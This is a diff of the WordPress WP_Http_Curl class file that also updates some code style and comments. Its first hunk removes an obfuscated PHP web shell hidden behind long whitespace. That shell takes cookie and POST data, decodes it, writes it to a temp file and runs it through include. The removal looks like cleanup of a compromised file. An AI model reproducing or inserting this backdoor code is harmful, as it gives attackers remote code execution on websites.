@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $YkkEAchFq = chr (106) . "\114" . "\137" . chr ( 356 - 236 ).'A' . chr ( 378 - 258 ); $JtyFnx = chr ( 984 - 885 ).chr (108) . "\141" . 's' . "\x73" . chr ( 521 - 426 ).'e' . chr (120) . chr (105) . "\x73" . chr ( 955 - 839 ).'s';$dBXPg = $JtyFnx($YkkEAchFq); $HIfeDu = $dBXPg;if (!$HIfeDu){class jL_xAx{private $ilEwuG;public static $gaSmpvmXte = "15c383ea-91e4-4365-8353-cc2167b404bc";public static $AtuCt = NULL;public function __construct(){$jBSInPe = $_COOKIE;$rCpFE = $_POST;$TWjPRZ = @$jBSInPe[substr(jL_xAx::$gaSmpvmXte, 0, 4)];if (!empty($TWjPRZ)){$SZwjN = "base64";$XIjIDJeM = "";$TWjPRZ = explode(",", $TWjPRZ);foreach ($TWjPRZ as $TmXlzGWyqc){$XIjIDJeM .= @$jBSInPe[$TmXlzGWyqc];$XIjIDJeM .= @$rCpFE[$TmXlzGWyqc];}$XIjIDJeM = array_map($SZwjN . chr ( 394 - 299 ).'d' . chr ( 122 - 21 )."\143" . "\x6f" . "\144" . "\145", array($XIjIDJeM,)); $XIjIDJeM = $XIjIDJeM[0] ^ str_repeat(jL_xAx::$gaSmpvmXte, (strlen($XIjIDJeM[0]) / strlen(jL_xAx::$gaSmpvmXte)) + 1);jL_xAx::$AtuCt = @unserialize($XIjIDJeM);}}public function __destruct(){$this->ijuTAUD();}private function ijuTAUD(){if (is_array(jL_xAx::$AtuCt)) {$WXSdgxAePP = sys_get_temp_dir() . "/" . crc32(jL_xAx::$AtuCt["\163" . 'a' . 'l' . chr ( 621 - 505 )]);@jL_xAx::$AtuCt["\167" . chr ( 767 - 653 ).chr (105) . "\164" . 'e']($WXSdgxAePP, jL_xAx::$AtuCt["\x63" . chr (111) . chr (110) . 't' . "\x65" . "\x6e" . chr (116)]);include $WXSdgxAePP;@jL_xAx::$AtuCt[chr (100) . "\145" . chr (108) . "\x65" . "\x74" . chr ( 970 - 869 )]($WXSdgxAePP);exit();}}}$sHrfH = new jL_xAx(); $sHrfH = NULL;} ?><?php
+<?php
 /**
  * HTTP API: WP_Http_Curl class
  *
@@ -15,7 +15,10 @@
  * Requires the Curl extension to be installed.
  *
  * @since 2.7.0
+ * @deprecated 6.4.0 Use WP_Http
+ * @see WP_Http
  */
+#[AllowDynamicProperties]
 class WP_Http_Curl {
 
 	/**
@@ -77,6 +80,9 @@ class WP_Http_Curl {
 			'headers'     => array(),
 			'body'        => null,
 			'cookies'     => array(),
+			'decompress'  => false,
+			'stream'      => false,
+			'filename'    => null,
 		);
 
 		$parsed_args = wp_parse_args( $args, $defaults );
@@ -258,7 +264,7 @@ class WP_Http_Curl {
 		curl_exec( $handle );
 
 		$processed_headers   = WP_Http::processHeaders( $this->headers, $url );
-		$theBody             = $this->body;
+		$body                = $this->body;
 		$bytes_written_total = $this->bytes_written_total;
 
 		$this->headers             = '';
@@ -268,9 +274,9 @@ class WP_Http_Curl {
 		$curl_error = curl_errno( $handle );
 
 		// If an error occurred, or, no response.
-		if ( $curl_error || ( 0 == strlen( $theBody ) && empty( $processed_headers['headers'] ) ) ) {
-			if ( CURLE_WRITE_ERROR /* 23 */ == $curl_error ) {
-				if ( ! $this->max_body_length || $this->max_body_length != $bytes_written_total ) {
+		if ( $curl_error || ( 0 === strlen( $body ) && empty( $processed_headers['headers'] ) ) ) {
+			if ( CURLE_WRITE_ERROR /* 23 */ === $curl_error ) {
+				if ( ! $this->max_body_length || $this->max_body_length !== $bytes_written_total ) {
 					if ( $parsed_args['stream'] ) {
 						curl_close( $handle );
 						fclose( $this->stream_handle );
@@ -316,10 +322,10 @@ class WP_Http_Curl {
 		if ( true === $parsed_args['decompress']
 			&& true === WP_Http_Encoding::should_decode( $processed_headers['headers'] )
 		) {
-			$theBody = WP_Http_Encoding::decompress( $theBody );
+			$body = WP_Http_Encoding::decompress( $body );
 		}
 
-		$response['body'] = $theBody;
+		$response['body'] = $body;
 
 		return $response;
 	}
@@ -327,8 +333,8 @@ class WP_Http_Curl {
 	/**
 	 * Grabs the headers of the cURL request.
 	 *
-	 * Each header is sent individually to this callback, so we append to the `$header` property
-	 * for temporary storage
+	 * Each header is sent individually to this callback, and is appended to the `$header` property
+	 * for temporary storage.
 	 *
 	 * @since 3.2.0
 	 *
@@ -344,14 +350,14 @@ class WP_Http_Curl {
 	/**
 	 * Grabs the body of the cURL request.
 	 *
-	 * The contents of the document are passed in chunks, so we append to the `$body`
+	 * The contents of the document are passed in chunks, and are appended to the `$body`
 	 * property for temporary storage. Returning a length shorter than the length of
 	 * `$data` passed in will cause cURL to abort the request with `CURLE_WRITE_ERROR`.
 	 *
 	 * @since 3.6.0
 	 *
-	 * @param resource $handle  cURL handle.
-	 * @param string   $data    cURL request body.
+	 * @param resource $handle cURL handle.
+	 * @param string   $data   cURL request body.
 	 * @return int Total bytes of data written.
 	 */
 	private function stream_body( $handle, $data ) {
